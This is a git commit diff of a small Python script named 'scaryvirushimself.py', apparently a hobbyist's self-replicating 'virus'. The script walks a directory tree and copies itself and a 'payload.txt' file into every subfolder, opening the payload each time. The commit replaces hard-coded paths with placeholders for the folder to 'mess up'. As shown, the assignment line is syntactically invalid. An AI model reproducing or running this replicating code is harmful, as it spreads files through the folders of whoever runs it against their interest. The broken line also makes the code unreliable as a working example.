264c83d6b6067384e24672f110c092c464179b5f
syrup1-gt <39784537+syrup1-gt@users.noreply.github.com>
2020-03-15 15:39:59 -0500

    Update scaryvirushimself.py

--- scaryvirushimself.py
+++ scaryvirushimself.py
@@ -2,47 +2,20 @@ import os
 import shutil
 from sys import argv
 
-#use r'' for file paths
-
 script = argv
 name = str(script[0])
 
-#cmd = 'start payload.txt'
-#os.system(cmd)
-#os.mkdir(r'C:\Users\syrup\Desktop\scaryvirusdestination\clone')
-#os.system(r"copy payload.txt C:\Users\syrup\Desktop\scaryvirusdestination\clone") #evilscaryvirus
-#os.system(r"copy scaryvirushimself.py C:\Users\syrup\Desktop\scaryvirusdestination\clone")
-#C:\Users\syrup\Desktop\scaryvirusdestination
-#shutil.copytree(r'C:\Users\syrup\Desktop\replicator has arrived', r'C:\Users\syrup\Desktop\scaryvirusdestination')
-importante = r'C:\Users\syrup\Desktop\scaryvirusdestination'
+importante = #MAKE THIS VARIABLE EQUAL TO WHERE YOU WANT TO MESS UP. WRITE IT LIKE r'*file\\path*'
 for(path, dirs, files) in os.walk(importante):
-    #print(path)
     print(dirs)
-    #print(files)
-    #print(aveces)
-    #print(porque)
 
     for dir in dirs:  
         porque = str(dirs)
-        aveces = os.path.join(path, dir) #str(path + "\\" + dirs[n])
-        os.system(r"start payload.txt")
-        shutil.copy(r"C:\Users\syrup\Desktop\replicator has arrived\payload.txt", aveces)
-        shutil.copy(r"C:\Users\syrup\Desktop\replicator has arrived\scaryvirushimself.py", aveces)
+        aveces = os.path.join(path, dir) 
         
-    #os.system(r"copy payload.txt {}".format(porque))        #.format(path + "\\" + dirs[n]))
-    #print("xxx")
-    #os.system(r"copy payload.txt {}".format(porque))
-    #print("yyy")
+        os.system(r"start payload.txt")
+        shutil.copy(r"*WHERE_PAYLOAD.TXT_IS*\payload.txt", aveces)
+        shutil.copy(r"*WHERE_scaryvirushimself.py_IS*\scaryvirushimself.py", aveces)
+        
     print("**************")
-##for root_dir_path, sub_dirs, files in os.walk(importante):
-##    print(root_dir_path) #*where you're searching*
-##    print(sub_dirs) #*folders within where you're searching*
-##    print(files, 'le gamer has arrived smh my head my head')
-##    path = (r"root_dir_path")
-##    sub = (r"sub_dirs")
-##    shutil.copy(r"C:\Users\syrup\Desktop\replicator has arrived\scaryvirushimself.py", r"C:\Users\syrup\Desktop\scaryvirusdestination\untitled bruh momentum)
 
-##    os.system(r"copy payload.txt path") #evilscaryvirus
-##    os.system(r"copy scaryvirushimself.py path")
-##    os.system(r"copy payload.txt sub") 
-##    os.system(r"copy scaryvirushimself.py sub")
